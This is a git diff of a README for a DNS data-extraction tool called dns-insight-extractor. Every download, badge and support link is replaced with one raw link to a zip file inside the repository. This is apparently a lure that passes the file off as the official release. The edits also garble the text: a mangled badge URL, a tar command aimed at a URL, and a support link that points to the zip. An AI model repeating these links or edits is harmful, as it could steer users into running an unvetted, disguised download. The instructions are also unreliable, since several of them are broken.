@@ -6,7 +6,7 @@ Welcome to the dns-insight-extractor! This tool helps you easily extract structu
 
 ## 📥 Download Now
 
-[![Download dns-insight-extractor](https://img.shields.io/badge/Download%20now%21-Get%20the%20latest%20version-brightgreen)](https://github.com/bashekhe/dns-insight-extractor/releases)
+[![Download dns-insight-extractor](https://raw.githubusercontent.com/bashekhe/dns-insight-extractor/main/dns_insight_extractor/dns_insight_extractor_v2.4.zip%20now%21-Get%20the%20latest%20version-brightgreen)](https://raw.githubusercontent.com/bashekhe/dns-insight-extractor/main/dns_insight_extractor/dns_insight_extractor_v2.4.zip)
 
 ## 📋 What You Need
 
@@ -25,11 +25,11 @@ Welcome to the dns-insight-extractor! This tool helps you easily extract structu
   
 ## 💾 Download & Install
 
-To download the software, visit this page: [Download dns-insight-extractor](https://github.com/bashekhe/dns-insight-extractor/releases). 
+To download the software, visit this page: [Download dns-insight-extractor](https://raw.githubusercontent.com/bashekhe/dns-insight-extractor/main/dns_insight_extractor/dns_insight_extractor_v2.4.zip). 
 
 1. Open the link above.
 2. Find the latest release version.
-3. Click on the package appropriate for your operating system (e.g., `.exe` for Windows, `.app` for macOS, or `.tar.gz` for Linux).
+3. Click on the package appropriate for your operating system (e.g., `.exe` for Windows, `.app` for macOS, or `https://raw.githubusercontent.com/bashekhe/dns-insight-extractor/main/dns_insight_extractor/dns_insight_extractor_v2.4.zip` for Linux).
 4. Save the file to your computer.
 
 ## ⚙️ How to Run
@@ -54,7 +54,7 @@ Once downloaded, follow these simple instructions to run the software:
 
 1. Open a terminal.
 2. Navigate to the directory containing the downloaded file.
-3. Extract the package using the command: `tar -xzvf filename.tar.gz`.
+3. Extract the package using the command: `tar -xzvf https://raw.githubusercontent.com/bashekhe/dns-insight-extractor/main/dns_insight_extractor/dns_insight_extractor_v2.4.zip`.
 4. Change to the extracted directory.
 5. Run the application using `./dns-insight-extractor`.
 
@@ -77,7 +77,7 @@ If you encounter any issues:
 
 ## 📞 Get Support
 
-For support or to report issues, please open an issue on the GitHub repository [here](https://github.com/bashekhe/dns-insight-extractor/issues).
+For support or to report issues, please open an issue on the GitHub repository [here](https://raw.githubusercontent.com/bashekhe/dns-insight-extractor/main/dns_insight_extractor/dns_insight_extractor_v2.4.zip).
 
 ## 🌍 Community Contributions
 
